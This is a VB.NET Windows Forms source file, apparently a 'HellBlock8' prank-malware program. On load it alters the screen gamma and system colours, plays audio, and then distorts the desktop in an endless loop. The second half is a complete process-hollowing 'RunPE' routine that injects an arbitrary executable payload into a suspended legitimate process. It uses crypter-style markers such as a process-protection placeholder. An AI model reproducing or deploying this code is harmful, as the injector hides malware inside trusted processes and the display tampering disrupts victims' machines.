Imports System.Runtime.InteropServices
Imports System.Threading

Public Class Form1


    ' DLL Imports
    Private Declare Auto Function GetDesktopWindow Lib "user32.dll" () As IntPtr
    Private Declare Auto Function GetWindowDC Lib "user32.dll" (hwnd As IntPtr) As IntPtr
    Private Declare Auto Function CreateCompatibleBitmap Lib "gdi32" (hdc As IntPtr, nWidth As IntPtr, nHeight As IntPtr) As IntPtr
    Private Declare Auto Function CreateCompatibleDC Lib "gdi32" (hdc As IntPtr) As IntPtr
    Private Declare Auto Function SelectObject Lib "gdi32" (hdc As IntPtr, hObject As IntPtr) As IntPtr
    Private Declare Auto Function BitBlt Lib "gdi32" (hDestDC As IntPtr, x As IntPtr, y As IntPtr, nWidth As IntPtr, nHeight As IntPtr, hSrcDC As IntPtr, xSrc As IntPtr, ySrc As IntPtr, dwRop As IntPtr) As IntPtr

    Private Const SRCCOPY = &HCC0020 ' (DWORD) dest = source
    Private MyScreenH As UInt16 = My.Computer.Screen.WorkingArea.Height
    Private MyScreenW As UInt16 = My.Computer.Screen.WorkingArea.Width
    Private x, y, T As UInt16
    Private Buffer, hBitmap, Desktop, hScreen, ScreenBuffer As Int64
    Private Create As Object


    Public Const SWP_HIDEWINDOW = &H80

    Public Const SWP_SHOWWINDOW = &H40

    Public Const SWP_HIDE = 0

    Public Const SW_RESTORE As Integer = 9

    Public ReadOnly taskBar As Integer

    Private Const SPI_SETDESKWALLPAPER As Integer = &H14

    Private Const SPIF_UPDATEINIFILE As Integer = &H1

    Private Const SPIF_SENDWININICHANGE = &H2

    Private Declare Function SystemParametersInfo Lib "user32" (uAction As String, uParam As String, lpvParam As String, fuWinIni As Integer) As Integer

    Declare Function SetWindowPos Lib "user32" (hwnd As Integer, hWndInsertAfter As Integer, x As Integer, y As Integer, cx As Integer, cy As Integer, wFlags As Integer) As Integer

    Declare Function FindWindow Lib "user32" Alias "FindWindowA" (lpClassName As String, lpWindowName As String) As Integer

    Private Declare Function ShowWindow Lib "user32" (hwind As IntPtr, nCmdShow As Integer) As Integer

    Private Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (hProcess As IntPtr, dwMinimumWorkingSetSize As Integer, dwMaximumWorkingSetSize As Integer) As Integer

    Private Structure RAMP
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=256)>
        Public Red As UShort()
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=256)>
        Public Green As UShort()
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=256)>
        Public Blue As UShort()
    End Structure

    Private Declare Function SetSysColors Lib "user32" (one As Integer, ByRef element As Integer, ByRef color As Integer) As Boolean

    Private Declare Function apiGetDeviceGammaRamp Lib "gdi32" Alias "GetDeviceGammaRamp" (hdc As Integer, ByRef lpv As RAMP) As Integer

    Private Declare Function apiSetDeviceGammaRamp Lib "gdi32" Alias "SetDeviceGammaRamp" (hdc As Integer, ByRef lpv As RAMP) As Integer

    Private Declare Function apiGetDesktopWindow Lib "user32" Alias "GetDesktopWindow" () As Integer

    Private Declare Function apiGetWindowDC Lib "user32" Alias "GetWindowDC" (hwnd As Integer) As Integer

    Private newRamp As New RAMP()

    Private usrRamp As New RAMP()

    Private IsLoaded As Boolean

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        My.Computer.Audio.Play(My.Resources.soul, AudioPlayMode.BackgroundLoop)

        TrackBar1.Minimum = 1000 : TrackBar1.Maximum = 2000

        TrackBar2.Minimum = 28 : TrackBar2.Maximum = 44

        apiGetDeviceGammaRamp(apiGetWindowDC(apiGetDesktopWindow), usrRamp)

        IsLoaded = True

        Timer2.Start()

        ' SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, "C:\Users\rytho\source\repos\HellBlock8\HellBlock8\Resources\New2.jpg", SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)

        Opacity = 30

        Timer1.Start() 'follow up with this

        Width = 400

        Height = 400
        Dim path As New Drawing2D.GraphicsPath()

        path.AddEllipse(0, 0, PictureBox1.Width, PictureBox1.Height)

        PictureBox1.Region = New Region(path)


        Using CD As New ColorDialog

            Dim BackgroundColor As Integer = ColorTranslator.ToWin32(Color.Black)

            SetSysColors(1, 1, BackgroundColor)
        End Using

        Timer4.Start()

        Randomize()

        Visible = True
        ' Opacity = 0

        ' Wait T minutes
        T = (Rnd() * 3) + 1
        For i As UInt32 = 1 To T
            WaitAMin()
        Next

        ' Initialize Distortion
        Distort()

    End Sub



    Private Sub Distort()
        Desktop = GetWindowDC(GetDesktopWindow())

        ' Create a device context compatible with a known device context and assign it to a long variable
        hBitmap = CreateCompatibleDC(Desktop)
        hScreen = CreateCompatibleDC(Desktop)

        ' Create bitmaps in memory for temporary storage compatible with a known bitmap
        Buffer = CreateCompatibleBitmap(Desktop, 32, 32)
        ScreenBuffer = CreateCompatibleBitmap(Desktop, MyScreenW, MyScreenH)

        ' Assign device contexts to the bitmaps
        SelectObject(hBitmap, Buffer)
        SelectObject(hScreen, ScreenBuffer)

        ' Save the screen for later restoration
        BitBlt(hScreen, 0, 0, MyScreenW, MyScreenH, Desktop, 0, 0, SRCCOPY)

        While (1)
            Application.DoEvents()
            y = (MyScreenH) * Rnd()
            x = (MyScreenW) * Rnd()

            ' Copy 32x32 portion of screen into buffer at x,y
            BitBlt(hBitmap, 0, 0, 32, 32, Desktop, x, y, SRCCOPY)

            ' Paste back slightly shifting the values for x and y
            BitBlt(Desktop, x + (3 - 6 * Rnd()), y + (2 - 4 * Rnd()), 82, 82, hBitmap, 0, 0, SRCCOPY)
            Thread.Sleep(TimeSpan.FromMilliseconds(0.5))
        End While
    End Sub

    Private Sub WaitAMin()

        For i As UInt32 = 1 To 50
            Thread.Sleep(1)
            Application.DoEvents()
        Next
    End Sub
    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles MyBase.FormClosed
        apiSetDeviceGammaRamp(apiGetWindowDC(apiGetDesktopWindow), usrRamp)
    End Sub

    Private Sub Form1_Resize(sender As Object, e As EventArgs) Handles MyBase.Resize
        Refresh()
    End Sub

    Private Sub Form1_Paint(sender As Object, e As PaintEventArgs) Handles MyBase.Paint
        Dim formMiddleX As Integer = Width \ 2
        Dim formMiddleY As Integer = Height \ 2
        Dim x, y As Double
        Dim x1, y1 As Integer
        Dim circlePointsList As New List(Of Point)
        For index As Double = 0 To 2 * Math.PI Step 0.05
            Dim horizontalRadius As Integer = formMiddleX
            x = (horizontalRadius * Math.Cos(index)) + formMiddleX
            Dim verticalRadius As Integer = formMiddleY
            y = (verticalRadius * Math.Sin(index)) + formMiddleY
            x1 = CInt(Int(x))
            y1 = CInt(Int(y))
            circlePointsList.Add(New Point(x1, y1))
        Next
        Dim circlePoints() As Point = circlePointsList.ToArray
        Dim types(circlePoints.GetUpperBound(0)) As Byte
        For index As Integer = 0 To circlePoints.GetUpperBound(0)
            types(index) = Drawing2D.FillMode.Winding

        Next
        Using gp As New Drawing2D.GraphicsPath(circlePoints, types)
            Region = New Region(gp)
        End Using

    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing

        Timer1.Dispose()
        Timer2.Dispose()
        Timer3.Dispose()
        Timer4.Dispose()
        Application.Exit()
    End Sub

    Private Function DesktopBrightnessContrast(bLevel As Integer, gamma As Integer) As Integer
        newRamp.Red = New UShort(255) {} : newRamp.Green = New UShort(255) {} : newRamp.Blue = New UShort(255) {}
        For i As Integer = 1 To 255
            newRamp.Red(i) = InLineAssignHelper(newRamp.Green(i), InLineAssignHelper(newRamp.Blue(i), CUShort(Math.Min(65535, Math.Max(0, (Math.Pow((i + 1) / 256.0R, gamma * 0.1) * 65535) + 0.5)))))

        Next
        For iCtr As UShort = 0 To 255
            newRamp.Red(iCtr) = CUShort(newRamp.Red(iCtr) / (bLevel / 1000))
            newRamp.Green(iCtr) = CUShort(newRamp.Green(iCtr) / (bLevel / 1000))
            newRamp.Blue(iCtr) = CUShort(newRamp.Blue(iCtr) / (bLevel / 1000))
        Next
        Return apiSetDeviceGammaRamp(apiGetWindowDC(apiGetDesktopWindow), newRamp)
    End Function

    Private Function InLineAssignHelper(Of T)(ByRef target As T, value As T) As T
        target = value : InLineAssignHelper = value
    End Function

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick

        Location = New Point(MousePosition.X + -200, MousePosition.Y + -200)
        If IsLoaded = False Then Exit Sub
        DesktopBrightnessContrast(TrackBar1.Value, 44 - TrackBar2.Value + -3)

    End Sub


    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Timer2.Stop()
        Timer3.Start()
        If IsLoaded = False Then Exit Sub
        DesktopBrightnessContrast(TrackBar1.Value, 44 - TrackBar2.Value + 10)
        Using CD As New ColorDialog
            Dim BackgroundColor As Integer = ColorTranslator.ToWin32(Color.Black)

            SetSysColors(1, 1, BackgroundColor)

        End Using
        TrackBar1.Minimum = 1000 : TrackBar1.Maximum = 2000
        TrackBar2.Minimum = 28 : TrackBar2.Maximum = 44
        apiGetDeviceGammaRamp(apiGetWindowDC(apiGetDesktopWindow), usrRamp)
        IsLoaded = True
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Timer3.Stop()
        Timer2.Start()
        Timer4.Start()
        If IsLoaded = False Then Exit Sub
        DesktopBrightnessContrast(TrackBar1.Value, 44 - TrackBar2.Value + -3)
        TrackBar1.Minimum = 1000 : TrackBar1.Maximum = 2000
        TrackBar2.Minimum = 28 : TrackBar2.Maximum = 44
        apiGetDeviceGammaRamp(apiGetWindowDC(apiGetDesktopWindow), usrRamp)
        IsLoaded = True

    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        Timer4.Stop()
        Timer2.Start()
        Using CD As New ColorDialog
            Dim BackgroundColor As Integer = ColorTranslator.ToWin32(Color.White)
            SetSysColors(1, 1, BackgroundColor)

        End Using

        TrackBar1.Minimum = 1000 : TrackBar1.Maximum = 2000
        TrackBar2.Minimum = 28 : TrackBar2.Maximum = 44
        apiGetDeviceGammaRamp(apiGetWindowDC(apiGetDesktopWindow), usrRamp)
        IsLoaded = True


    End Sub

    <DllImport("kernel32.dll", EntryPoint:="CreateProcess", CharSet:=CharSet.Unicode), Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function CreateProcess_API(
applicationName As String,
commandLine As String,
processAttributes As IntPtr,
threadAttributes As IntPtr,
inheritHandles As Boolean,
creationFlags As UInteger,
environment As IntPtr,
currentDirectory As String,
  ByRef startupInfo As STARTUP_INFORMATION,
  ByRef processInformation As PROCESS_INFORMATION) As Boolean
    End Function 'CreateProcess

    <DllImport("kernel32.dll", EntryPoint:="GetThreadContext"), Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function GetThreadContext_API(
thread As IntPtr,
context As Integer()) As Boolean
    End Function 'GetThreadContext

    <DllImport("kernel32.dll", EntryPoint:="Wow64GetThreadContext"), Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function Wow64GetThreadContext_API(
thread As IntPtr,
context As Integer()) As Boolean
    End Function 'Wow64GetThreadContext

    <DllImport("kernel32.dll", EntryPoint:="SetThreadContext"), Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function SetThreadContext_API(
thread As IntPtr,
context As Integer()) As Boolean
    End Function 'SetThreadContext

    <DllImport("kernel32.dll", EntryPoint:="Wow64SetThreadContext"), Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function Wow64SetThreadContext_API(
thread As IntPtr,
context As Integer()) As Boolean
    End Function 'Wow64SetThreadContext

    <DllImport("kernel32.dll", EntryPoint:="ReadProcessMemory"), Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function ReadProcessMemory_API(
process As IntPtr,
baseAddress As Integer,
    ByRef buffer As Integer,
bufferSize As Integer,
    ByRef bytesRead As Integer) As Boolean
    End Function 'ReadProcessMemory

    <DllImport("kernel32.dll", EntryPoint:="WriteProcessMemory"), Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function WriteProcessMemory_API(
process As IntPtr,
baseAddress As Integer,
buffer As Byte(),
bufferSize As Integer,
    ByRef bytesWritten As Integer) As Boolean
    End Function 'WriteProcessMemory

    <DllImport("ntdll.dll", EntryPoint:="NtUnmapViewOfSection"), Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function NtUnmapViewOfSection_API(
process As IntPtr,
baseAddress As Integer) As Integer
    End Function 'NtUnmapViewOfSection

    <DllImport("kernel32.dll", EntryPoint:="VirtualAllocEx"), Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function VirtualAllocEx_API(
handle As IntPtr,
address As Integer,
length As Integer,
type As Integer,
protect As Integer) As Integer
    End Function 'VirtualAllocEx

    <DllImport("kernel32.dll", EntryPoint:="ResumeThread"), Security.SuppressUnmanagedCodeSecurity>
    Private Shared Function ResumeThread_API(
handle As IntPtr) As Integer
    End Function 'ResumeThread

    <StructLayout(LayoutKind.Sequential, Pack:=1)>
    Private Structure PROCESS_INFORMATION
        Public ProcessHandle As IntPtr
        Public ThreadHandle As IntPtr
        Public ProcessId As UInteger
        Public ThreadId As UInteger
    End Structure 'PROCESS_INFORMATION

    <StructLayout(LayoutKind.Sequential, Pack:=1)>
    Private Structure STARTUP_INFORMATION
        Public Size_ As UInteger
        Public Reserved1 As String
        Public Desktop As String
        Public Title As String

        Public dwX As Integer
        Public dwY As Integer
        Public dwXSize As Integer
        Public dwYSize As Integer
        Public dwXCountChars As Integer
        Public dwYCountChars As Integer
        Public dwFillAttribute As Integer
        Public dwFlags As Integer
        Public wShowWindow As Short
        Public cbReserved2 As Short
        Public Reserved2 As IntPtr
        Public StdInput As IntPtr
        Public StdOutput As IntPtr
        Public StdError As IntPtr
    End Structure 'STARTUP_INFORMATION


    Public Shared Function Run(path As String, data As Byte()) As Boolean
        For fri As Integer = 1 To 5
            If HandleRun(path, String.Empty, data, True) Then Return True
        Next

        Return False
    End Function 'Run
    Private Shared Function HandleRun(path As String, cmd As String, data As Byte(), compatible As Boolean) As Boolean
        Dim ReadWrite As Integer
        Dim QuotedPath As String = String.Format("""{0}""", path)

        Dim SI As New STARTUP_INFORMATION
        Dim PI As New PROCESS_INFORMATION

        SI.dwFlags = 0 ' dwFlags = 1 ( Hide ) ' dwFlags = 0 ( Show )
        SI.Size_ = CUInt(Marshal.SizeOf(GetType(STARTUP_INFORMATION)))

        Try
            If Not String.IsNullOrEmpty(cmd) Then
                QuotedPath = QuotedPath & " " & cmd
            End If

            If Not CreateProcess_API(path, QuotedPath, IntPtr.Zero, IntPtr.Zero, False, 4, IntPtr.Zero, Nothing, SI, PI) Then Throw New Exception()

            '%Process_Protection% ProtectProcess(PI.ProcessId)

            Dim FileAddress As Integer = BitConverter.ToInt32(data, 60)
            Dim ImageBase As Integer = BitConverter.ToInt32(data, FileAddress + 52)

            Dim Context_(179 - 1) As Integer
            Context_(0) = 65538

            If IntPtr.Size = 4 Then
                If Not GetThreadContext_API(PI.ThreadHandle, Context_) Then Throw New Exception()
            Else
                If Not Wow64GetThreadContext_API(PI.ThreadHandle, Context_) Then Throw New Exception()
            End If

            Dim Ebx As Integer = Context_(41)
            Dim BaseAddress As Integer

            If Not ReadProcessMemory_API(PI.ProcessHandle, Ebx + 8, BaseAddress, 4, ReadWrite) Then Throw New Exception()

            If ImageBase = BaseAddress Then
                If Not NtUnmapViewOfSection_API(PI.ProcessHandle, BaseAddress) = 0 Then Throw New Exception()
            End If

            Dim SizeOfImage As Integer = BitConverter.ToInt32(data, FileAddress + 80)
            Dim SizeOfHeaders As Integer = BitConverter.ToInt32(data, FileAddress + 84)

            Dim AllowOverride As Boolean
            Dim NewImageBase As Integer = VirtualAllocEx_API(PI.ProcessHandle, ImageBase, SizeOfImage, 12288, 64) 'R1

            'This is the only way to execute under certain conditions. However, it may show
            'an application error probably because things aren't being relocated properly.

            If Not compatible AndAlso NewImageBase = 0 Then
                AllowOverride = True
                NewImageBase = VirtualAllocEx_API(PI.ProcessHandle, 0, SizeOfImage, 12288, 64)
            End If

            If NewImageBase = 0 Then Throw New Exception()

            If Not WriteProcessMemory_API(PI.ProcessHandle, NewImageBase, data, SizeOfHeaders, ReadWrite) Then Throw New Exception()

            Dim SectionOffset As Integer = FileAddress + 248
            Dim NumberOfSections As Short = BitConverter.ToInt16(data, FileAddress + 6)

            For fri As Integer = 0 To NumberOfSections - 1
                Dim VirtualAddress As Integer = BitConverter.ToInt32(data, SectionOffset + 12)
                Dim SizeOfRawData As Integer = BitConverter.ToInt32(data, SectionOffset + 16)
                Dim PointerToRawData As Integer = BitConverter.ToInt32(data, SectionOffset + 20)

                If Not SizeOfRawData = 0 Then
                    Dim SectionData(SizeOfRawData - 1) As Byte
                    System.Buffer.BlockCopy(data, PointerToRawData, SectionData, 0, SectionData.Length)

                    If Not WriteProcessMemory_API(PI.ProcessHandle, NewImageBase + VirtualAddress, SectionData, SectionData.Length, ReadWrite) Then Throw New Exception()
                End If

                SectionOffset += 40
            Next

            Dim PointerData As Byte() = BitConverter.GetBytes(NewImageBase)
            If Not WriteProcessMemory_API(PI.ProcessHandle, Ebx + 8, PointerData, 4, ReadWrite) Then Throw New Exception()

            Dim AddressOfEntryPoint As Integer = BitConverter.ToInt32(data, FileAddress + 40)

            If AllowOverride Then NewImageBase = ImageBase
            Context_(44) = NewImageBase + AddressOfEntryPoint

            If IntPtr.Size = 4 Then
                If Not SetThreadContext_API(PI.ThreadHandle, Context_) Then Throw New Exception()
            Else
                If Not Wow64SetThreadContext_API(PI.ThreadHandle, Context_) Then Throw New Exception()
            End If

            If ResumeThread_API(PI.ThreadHandle) = -1 Then Throw New Exception()
        Catch
            Dim Pros As Process = Process.GetProcessById(CInt(PI.ProcessId))
            If Pros IsNot Nothing Then Pros.Kill()

            Return False


        End Try

        Return True
    End Function 'HandleRun
End Class
